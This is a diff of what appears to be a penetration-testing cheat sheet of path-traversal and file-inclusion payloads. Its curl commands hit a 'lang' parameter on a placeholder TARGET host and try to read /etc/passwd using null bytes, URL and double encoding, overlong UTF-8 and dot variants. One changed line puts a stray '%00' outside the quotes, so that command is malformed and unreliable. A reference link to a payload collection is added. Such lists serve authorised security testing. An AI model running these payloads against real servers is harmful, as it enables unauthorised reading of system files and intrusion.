@@ -59,7 +59,7 @@ curl -si "http://TARGET/index.php?lang=/etc/passwd%00"
 curl -si "http://TARGET/index.php?lang=%2Fetc%2Fpasswd"
 
 # Double-encoded
-curl -si "http://TARGET/index.php?lang=%252Fetc%252Fpasswd"
+curl -si "http://TARGET/index.php?lang=%252Fetc%252Fpasswd"%00
 
 # Mixed encodings / dot-variants
 curl -si "http://TARGET/index.php?lang=..%2F..%2F..%2F..%2Fetc%2Fpasswd"
@@ -77,3 +77,5 @@ curl -si "http://TARGET/index.php?lang=%C0%AE%C0%AE%2F%C0%AE%C0%AE%2Fetc%2Fpassw
 # UTF-8 percent-encoding of dots/slashes
 curl -si "http://TARGET/index.php?lang=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
 ```
+
+Ref: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal#url-encoding
